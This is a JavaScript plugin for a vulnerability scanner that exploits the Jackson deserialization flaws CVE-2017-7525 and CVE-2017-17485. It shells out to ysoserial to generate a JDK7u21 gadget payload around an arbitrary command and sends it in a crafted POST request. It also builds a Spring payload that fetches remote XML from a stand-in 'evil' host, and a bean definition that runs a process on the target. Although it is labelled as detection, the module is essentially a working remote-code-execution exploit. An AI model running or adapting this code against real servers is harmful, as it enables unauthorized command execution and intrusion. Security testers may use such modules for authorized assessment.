module.exports={
	tags:"jackson,web,CVE-2017-7525,CVE-2017-17485",
    des:"CVE-2017-7525,Vulnerability detection,JDK7u21,CVE-2017-17485",
    dependencies:"java,ysoserial,base64,tr",
	VulApps:[],
	urls:["https://github.com/vulhub/vulhub/tree/master/jackson/CVE-2017-7525"],
	doCheck:function (url,fnCbk,parms)
	{
        url = url.trim().replace(/[\s\r\n]*/gmi,'');
        var _t = this,_s = this.self,hst = _s.parseUrl(url);
        hst.port = hst.port||(-1 < hst.protocol.indexOf("https")?443:80);
        
        
        try{
            var szPay1 = _s.child_process.execSync("java -jar jars/ysoserial-0.0.6-SNAPSHOT-all.jar Jdk7u21 '" + _s.g_szCmd + "'|base64|tr -d \"\n\"").toString("utf-8");
            var len = 217 + szPay1.length,szPaload = `POST ${hst.pathname} HTTP/1.1
Host: ${hst.hostname}:${hst.port}
Accept: */*
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: ${len}

{
    "param": [
    "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    {
        "transletBytecodes": [
    "${szPay1}"
        ],
        "transletName": "a.b",
        "outputProperties": {}
    }
    ]
}


`,szPaload1 = `POST ${hst.pathname} HTTP/1.1
Host: ${hst.hostname}:${hst.port}
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 180

{
    "param": [
      "org.springframework.context.support.FileSystemXmlApplicationContext",
      "http://evil/spel.xml"
    ]
}


`,szXml = `<beans xmlns="http://www.springframework.org/schema/beans"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xsi:schemaLocation="
http://www.springframework.org/schema/beans
http://www.springframework.org/schema/beans/spring-beans.xsd
">
<bean id="pb" class="java.lang.ProcessBuilder">
 <constructor-arg>
     <array>
         <value>touch</value>
         <value>/tmp/prove2.txt</value>
     </array>
 </constructor-arg>
 <property name="any" value="#{ pb.start() }"/>
</bean>
</beans>`;
            _s.fnSocket(hst.hostname,hst.port,szPaload,function(s)
            {
                var i = 0;
                s = String(s);
                var r = {"url":url,"send":szPaload};
                if(-1 < (i = s.indexOf("whoami")))
                {
                    r.vul = true;
                    fnCbk(r,_t);
                }
            });
        }catch(e){
            _s.error(e)}
	}
};